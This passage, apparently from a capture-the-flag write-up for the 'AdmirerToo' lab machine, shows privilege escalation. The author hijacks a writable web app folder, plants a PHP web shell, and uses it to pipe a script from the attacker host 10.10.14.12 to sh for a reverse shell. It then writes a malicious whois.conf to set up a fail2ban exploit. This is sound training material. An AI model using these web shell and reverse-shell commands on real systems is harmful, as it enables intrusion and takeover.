drwxr-xr-x  9 root hbase 4096 Jul  8  2021 hbase
drwxr-xr-x 23 root root  4096 Jul 21 12:05 opencats
```

This means we can simply move the `opencats` folder somewhere else and copy it back to the location.

```
jennifer@admirertoo:/opt$ mv opencats/ opencats.bak
jennifer@admirertoo:/opt$ cp -r opencats.bak opencats
```

This way we took ownership of the application.

```
jennifer@admirertoo:/opt$ ls -la
total 20
drwxr-xrwx  5 root     root  4096 Jan 16 10:10 .
drwxr-xr-x 18 root     root  4096 Jan 11 11:20 ..
drwxr-xr-x  9 root     hbase 4096 Jul  8  2021 hbase
drwxr-xr-x 23 jennifer users 4096 Jan 16 10:10 opencats
drwxr-xr-x 23 root     root  4096 Jul 21 12:05 opencats.bak
```

Now we can simply write a small php web shell in the root of the web app.

```
jennifer@admirertoo:/opt$ echo '<?php system($_REQUEST[1]); ?>' > opencats/backdoor.php
```

Accessing the shell from inside or outside doesn't really matter but we use ssh to forward it to our machine.

```
jennifer@admirertoo:~$
ssh> -L:8081:127.0.0.1:8080
Forwarding port.
```

Now we can use curl to achieve RCE as the user devel.

```
$ curl 'http://localhost:8081/backdoor.php?1=id'
uid=1003(devel) gid=1003(devel) groups=1003(devel)
```

To get a persistent shell we set up a `ncat` listener and curl our `shell` file from earlier which we pass to `sh`.

```
nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

```
$ curl 'http://localhost:8081/backdoor.php?1=curl%2010.10.14.12:8000/shell|sh'
```

After it connects back we upgrade it to a full tty using python.

```
nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.162.237.
Ncat: Connection from 10.129.162.237:34532.
bash: cannot set terminal process group (713): Inappropriate ioctl for device
bash: no job control in this shell
devel@admirertoo:/opt/opencats$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ats$ python3 -c 'import pty;pty.spawn("/bin/bash")'
devel@admirertoo:/opt/opencats$ export TERM=xterm
export TERM=xterm
devel@admirertoo:/opt/opencats$ ^Z
[1]  + 22478 suspended  nc -lnvp 7575
$ stty raw -echo;fg
[1]  + 22478 continued  nc -lnvp 7575
```

Being devel we can now simply write the `whois.conf` in `/usr/local/etc/`

```
devel@admirertoo:/usr/local/etc$ echo '\.*$    10.10.14.12' > whois.conf
```

The other steps of the fail2ban exploit stay the same. We create our payload, serve it on port `43` using ncat and trigger it using hydra with a bruteforce against ssh.